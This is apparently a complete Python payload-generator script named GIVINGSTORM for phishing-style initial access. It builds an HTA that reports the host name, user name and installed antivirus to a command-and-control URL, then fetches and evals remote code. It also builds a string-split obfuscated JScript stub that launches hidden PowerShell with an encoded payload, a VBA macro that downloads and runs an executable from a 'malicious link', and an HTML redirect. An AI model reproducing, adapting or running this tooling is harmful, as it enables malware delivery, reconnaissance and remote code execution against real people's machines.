#!/usr/bin/env python3

# Default Imports
import os, argparse


class GIVINGSTORM:
    def __init__(self, name, c2url, c2payload, exeurl):
        self.name = name
        self.c2url = c2url
        self.c2payload = c2payload
        self.exeurl = exeurl
        
    def generate_hta(self, name, c2url):
        virtual_hta = "./Payloads/" + name + ".hta"
        virtual_payload = name + ".txt"
        try:
            hta = "<html>\n"
            hta += "<head>\n"
            hta += "<script type=text/vbs>\n"
            hta += "On Error Resume Next\n"
            hta += 'strComputer = "."\n'
            hta += r'Set oWMI = GetObject("winmgmts:{impersonationLevel=impersonate}!\\" & strComputer & "\root\SecurityCenter2")'
            hta += "\n"
            hta += 'Set colItems = oWMI.ExecQuery("Select * from AntiVirusProduct")\n'
            hta += 'Set o = CreateObject("MSXML2.XMLHTTP")\n'
            hta += 'Set s = CreateObject("WScript.Shell")\n'
            hta += 'strInfo = s.expandenvironmentstrings("%COMPUTERNAME%")\n'
            hta += 'strInfo = strInfo & "%20" & s.expandenvironmentstrings("%USERNAME%")\n'
            hta += 'o.Open "GET", "'
            hta += str(c2url)
            hta += "/"
            hta += 'phonehome.html?b=" & strInfo, False\n'
            hta += "o.send\n"
            hta += "For Each objItem In colItems\n"
            hta += 'o.Open "GET", "'
            hta += str(c2url)
            hta += "/"
            hta += 'vbtest.aspx?a=" & Replace(objItem.DisplayName, " ", "%20"), False\n'
            hta += "o.send\n"
            hta += "Next\n"
            hta += 'Set scriblin = CreateObject("MSXML2.ServerXMLHTTP.6.0")\n'
            hta += 'scriblin.Open "GET", "'
            hta += str(c2url)
            hta += "/"
            hta += str(virtual_payload)
            hta += '", False'
            hta += "\nscriblin.send\n"
            hta += "GIVINGSTORMt = scriblin.responsetext\n"
            hta += "</script>\n"
            hta += "<script type=text/javascript>eval(GIVINGSTORMt);</script>\n"
            hta += "</head>\n"
            hta += "<body>\n"
            hta += "<script type=text/javascript>self.close();</script>\n"
            hta += "</body>\n"
            hta += "</html>\n"

            hf = open(virtual_hta, "w+")
            hf.write(hta)
            hf.close()

        except Exception as e:
           print(f"Error encountered...\nReview the following: {str(e)}")

    def generate_eval_payload(self, name, c2payload):
        virtual_payload = "./Payloads/" + name + ".txt"
        try:
            payload = "var a='WSc' +"
            payload += "'ript.Sh' +"
            payload += "'ell';var b = 'ne' +"
            payload += "'w Ac' + 'tiveXO' +"
            payload += "'bjec' + 't(a).Ru' +"
            payload += "'n(c);';var z='po' +"
            payload += "'wers' + 'h' +"
            payload += "'ell';var c= z +"
            payload += "'.e' + 'xe -No' +"
            payload += "'P -sta -N' +"
            payload += "'onI -W Hidd' +"
            payload += "'en -e' +"
            payload += "'x' +"
            payload += "'e' +"
            payload += "'c un' +"
            payload += "'rest' +"
            payload += "'rict' +"
            payload += "'ed -En' +"
            payload += "'c ' +"
            payload += " '"
            payload += str(c2payload)
            payload += "'"
            payload += ";eval(b);"

            pf = open(virtual_payload, "w+")
            pf.write(payload)
            pf.close()

        except Exception as e:
          print(f"Error encountered...\nReview the following: {str(e)}")

    def generate_macro(self, name, exeurl):
        virtual_executable = name + ".exe"
        virtual_macro = "./Payloads/" + name + ".vba"
        try:
            macro = "Sub WriteQuiggle()\n"
            macro += "Dim QuiggleFile As Integer\n"
            macro += "Dim FilePath As String\n"
            macro += "FilePath = \n"
            macro += r'"C:\temp\quiggle.vbs"'
            macro += "\nQuiggleFile = FreeFile\n"
            macro += "Open FilePath For Output as TextFile\n"
            macro += r'Print #QuiggleFile, "HTTPDownload "'
            macro += str(exeurl)
            macro += "/"
            macro += r'", "C:\temp""'
            macro += '\nPrint #QuiggleFile, "  Sub HTTPDownload( myURL, myPath )"\n'
            macro += 'Print #QuiggleFile, "    Dim i, objFile, objFSO, objHTTP, strFile, strMsg"\n'
            macro += 'Print #QuiggleFile, "	 Const ForReading = 1, ForWriting = 2, ForAppending = 8"\n'
            macro += 'Print #QuiggleFile, "    Set objFSO = CreateObject( "Scripting.FileSystemObject" )"\n'
            macro += 'Print #QuiggleFile, "    If objFSO.FolderExists( myPath ) Then"\n'
            macro += 'Print #QuiggleFile, "      strFile = objFSO.BuildPath( myPath, Mid( myURL, InStrRev( myURL, "/" ) + 1 ) )"\n'
            macro += r'Print #QuiggleFile, "    ElseIf objFSO.FolderExists( Left( myPath, InStrRev( myPath, "\" ) +1 ) ) Then"'
            macro += '\nPrint #QuiggleFile, "      strFile = myPath"\n'
            macro += 'Print #QuiggleFile, "    End If"\n'
            macro += 'Print #QuiggleFile, "	   Set objFile = objFSO.OpenTextFile( strFile, ForWriting, True )"\n'
            macro += 'Print #QuiggleFile, "      Set objHTTP = CreateObject( "WinHttp.WinHttpRequest.5.1" )"\n'
            macro += 'Print #QuiggleFile, "      objHTTP.Open "GET", myURL, False"\n'
            macro += 'Print #QuiggleFile, "      objHTTP.Send"\n'
            macro += 'Print #QuiggleFile, "      For i = 1 to LenB( objHTTP.ResponseBody )"\n'
            macro += 'Print #QuiggleFile, "        objFile.Write Chr(AscB( MidB( objHTTP.ResponseBody, i, 1 ) ) )"\n'
            macro += 'Print #QuiggleFile, "    Next"\n'
            macro += 'Print #QuiggleFile, "    objfile.Close()"\n'
            macro += 'Print #QuiggleFile, "    Set WshShell = wscript.CreateObject("Wscript.Shell")"\n'
            macro += 'Print #QuiggleFile, "    WshShell.Run "'
            macro += r"c:\temp"
            macro += chr(92)
            macro += str(virtual_executable)
            macro += '""\n'
            macro += 'Print #QuiggleFile, "    End Sub"\n'
            macro += 'Close QuiggleFile\n'
            macro += r'Shell "wscript c:\temp\quiggle.vbs"'
            macro += '\nEnd Sub\n'

            mf = open(virtual_macro, "w+")
            mf.write(macro)
            mf.close()

        except Exception as e:
           print(f"Error encountered...\nReview the following: {str(e)}")

    def generate_redirect(self, name, c2url):
        virtual_redirect = "./Payloads/" + name + ".html"
        try:
            redirect = "<html>\n"
            redirect += "<head>\n"
            redirect += "<title>Redirect</title>\n"
            redirect += '<meta http-equiv="Refresh"\n'
            redirect += 'content="0;url='
            redirect += str(c2url)
            redirect += "/"
            redirect += str(virtual_redirect)
            redirect += '">\n'
            redirect += "</head>\n"
            redirect += "<body>\n"
            redirect += r'<img src="#"/>'
            redirect += "\n<br>\n"
            redirect += "</body>"
            redirect += "</html>"

            rf = open(virtual_redirect, "w+")
            rf.write(redirect)
            rf.close()

        except Exception as e:
           print(f"Error encountered...\nReview the following: {str(e)}")
    
    def validate_directory(self, name):
        try:
            directory = "./Payloads/"

            if not os.path.isdir(directory):
                os.makedirs(directory)
            else:
                pass
        except Exception as e:
            print(f"Error encountered...\nReview the following: {str(e)}")

def main():
    parser = argparse.ArgumentParser()
    parser.add_argument("-n", help="HTA payload with redirect", dest="name")
    parser.add_argument("-p", help="B64 encoded payload", dest="c2payload")
    parser.add_argument("-c", help="Client domain for whois", dest="c2url")
    parser.add_argument("-e", help="Malicious link hosting .exe", dest="exeurl")

    args = parser.parse_args()

    InitGIVINGSTORM = GIVINGSTORM(args.name, args.c2url, args.c2payload, args.exeurl)
    InitGIVINGSTORM.validate_directory(args.name)
    print("\n----------[GIVINGSTORM]----------")
    if not args.exeurl:
        InitGIVINGSTORM.generate_hta(args.name, args.c2url)
        print("\n[*] Successfully generated .hta! ")

        InitGIVINGSTORM.generate_redirect(args.name, args.c2url)
        print("\n[*] Successfully generated .html redirect! ")
        
        InitGIVINGSTORM.generate_eval_payload(args.name, args.c2payload)
        print("\n[*] Successfully generated obfuscated payload file.")

    else:
        InitGIVINGSTORM.generate_macro(args.name, args.exeurl)
        print("\n[*] Successfully generated macro payload! ")

if __name__ == "__main__":


    try:
        main()
    except KeyboardInterrupt:
        print("\n \033[1;31m[!] Ctrl + C Detected, Quitting...")
    exit(0)

    